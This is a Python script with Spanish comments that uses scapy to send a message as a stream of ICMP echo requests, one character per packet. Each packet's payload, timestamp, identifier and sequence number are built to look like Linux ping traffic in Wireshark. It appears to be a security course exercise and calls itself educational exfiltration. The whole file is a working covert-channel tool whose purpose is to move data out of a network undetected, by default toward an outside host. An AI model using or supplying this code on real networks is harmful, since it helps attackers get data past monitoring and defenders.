#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Envía un mensaje (p. ej., el resultado del César de la Actividad 1)
como una secuencia de ICMP Echo Request (IPv4), 1 carácter por paquete,
construyendo el payload para que se vea como 'ping' de Linux en Wireshark.

Requisitos de 'stealth' que cumple:
- Inyecta el texto cifrado en el tráfico ICMP (1 char/paquete).
- Mantiene un timestamp en los primeros 8 bytes (como ping Linux).
- Mantiene un 'identifier' coherente (constante durante la corrida).
- Mantiene 'sequence number' coherente (incrementa de a 1).
- Mantiene el patrón del payload ICMP:
    * Primeros 8 bytes: timestamp (tv_sec, tv_usec).
    * Bytes 0x10..0x37 (16..55): secuencia estándar 0x10,0x11,...,0x37.
    * El carácter se inserta en el byte 0x0F (15), fuera del rango 0x10..0x37.
"""

import argparse
import os
import random
import struct
import time

from scapy.all import IP, ICMP, send  # type: ignore


def build_ping_like_payload(char: str) -> bytes:
    """
    Crea un payload con formato similar a 'ping' de Linux:
    - 8 bytes iniciales: timestamp (tv_sec, tv_usec) en big endian (!II).
    - Bytes 0x08..0x37: secuencia ascendente (0x08..0x37) => 48 bytes.
    - Se sobrescribe SOLO el byte 0x0F (15) con el ASCII del carácter a enviar.
      Se conservan intactos los bytes 0x10..0x37 (16..55) como pide el enunciado.
    """
    now = time.time()
    tv_sec = int(now)
    tv_usec = int((now - tv_sec) * 1_000_000)
    ts = struct.pack("!II", tv_sec, tv_usec)  # 8 bytes

    tail = bytes(range(0x08, 0x38))  # 0x08..0x37 (48 bytes)

    payload = bytearray(ts + tail)  # total 56 bytes (como ping por defecto)

    # Inyectar el carácter en el byte offset 0x0F (15) — fuera del rango 0x10..0x37
    payload[0x0F] = ord(char[0])  # nos aseguramos de tomar un solo char

    return bytes(payload)


def main():
    parser = argparse.ArgumentParser(
        description="Exfiltración educativa por ICMP (1 char por paquete) con payload tipo ping."
    )
    parser.add_argument("message", help="Mensaje a enviar (cifrado del paso 1).")
    parser.add_argument(
        "-t", "--target", default="8.8.8.8", help="Destino IPv4 (default: 8.8.8.8)"
    )
    parser.add_argument(
        "--append-b",
        action="store_true",
        help="Agrega una 'b' al final (según requisito del enunciado).",
    )
    parser.add_argument(
        "--id",
        type=lambda x: int(x, 0),
        default=None,
        help="Identifier ICMP fijo (0..65535). Si no se indica, se genera aleatorio.",
    )
    parser.add_argument(
        "--seq-start",
        type=int,
        default=1,
        help="Número de secuencia inicial (default: 1).",
    )
    parser.add_argument(
        "--pps",
        type=float,
        default=2.0,
        help="Paquetes por segundo (default: 2.0).",
    )
    args = parser.parse_args()

    # Requiere privilegios
    if os.geteuid() != 0:
        raise SystemExit("Este script debe ejecutarse como root (sudo).")

    message = args.message
    if args.append_b and (len(message) == 0 or message[-1] != "b"):
        message += "b"

    # Identifier coherente durante toda la sesión (como hace ping por proceso)
    icmp_id = args.id if args.id is not None else random.randint(0, 0xFFFF)

    seq = args.seq_start
    delay = 1.0 / max(args.pps, 0.01)

    print(f"Destino: {args.target}")
    print(f"Identifier: {icmp_id}")
    print(f"Secuencia inicial: {seq}")
    print(f"Enviando {len(message)} paquetes (1 char por paquete) a ~{args.pps} pps...\n")

    for ch in message:
        payload = build_ping_like_payload(ch)

        pkt = IP(dst=args.target)/ICMP(type=8, code=0, id=icmp_id, seq=seq)/payload

        # Enviar y mostrar un breve log
        send(pkt, verbose=False)
        print(f"Sent 1 packets.  char='{ch}'  seq={seq}")

        seq += 1
        time.sleep(delay)

    print("\nListo.")


if __name__ == "__main__":
    main()
